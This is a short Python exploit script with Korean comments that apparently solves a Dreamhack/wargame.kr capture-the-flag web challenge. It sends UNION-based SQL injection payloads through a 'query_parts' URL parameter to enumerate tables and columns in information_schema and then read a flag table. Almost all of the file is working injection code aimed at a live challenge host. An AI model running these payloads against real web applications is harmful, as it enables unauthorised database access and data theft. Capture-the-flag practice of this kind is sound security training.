'''
exploit..!
- search_cols에는 select box에 없는 단어를 입력
- 요청 시 query_parts를 직접 전달
    ex) ?search_cols=test&query_parts=1=1&operator=or
- query_parts에 인젝션 코드 입력(테이블 이름찾기)
- mysql table 목록 조회 FROM information_schema.TABLES
'''
from re import I
import requests
from urllib import parse


host = "http://host3.dreamhack.games:15351/?"
s = requests.Session()

# 1=0 or (subquery)
# 길이는 최대 64글자.. 그럼 64번 substr을 돌려야할듯?
# 왜 테이블 스키마에 database() 를 붙이는거임???
# 현재 데이터베이스를 모르니까 데이터베이스이름을 리턴해주는 database() 호출..!!
# union으로 접근하기

## 테이블 이름 조회
param = f"search_cols=test&keyword=&query_parts=1=1 union (select 1, table_name, 3, 4 from information_schema.tables where table_schema=database())"
res = s.get(host + (param))
if "welcome to wargame.kr" in res.text :
    print("this is true")
    #print(res.text) # Th1s_1s_Flag_tbl
    
## 해당 테이블 컬럼 조회
param = f"search_cols=test&keyword=&query_parts=1=1 union (select ORDINAL_POSITION, COLUMN_NAME,COLUMN_TYPE,COLUMN_KEY FROM INFORMATION_SCHEMA.COLUMNS where table_Schema = database() and table_name = 'Th1s_1s_Flag_tbl')"
res = s.get(host + (param))
if "welcome to wargame.kr" in res.text :
    print("this is true")
    #print(res.text) # flag
    
## flag 획득
param = f"search_cols=test&keyword=&query_parts=1=1 union (select 1, f1ag,3,4 FROM Th1s_1s_Flag_tbl)"
res = s.get(host + (param))
if "welcome to wargame.kr" in res.text :
    print("this is true")
    print(res.text) # flag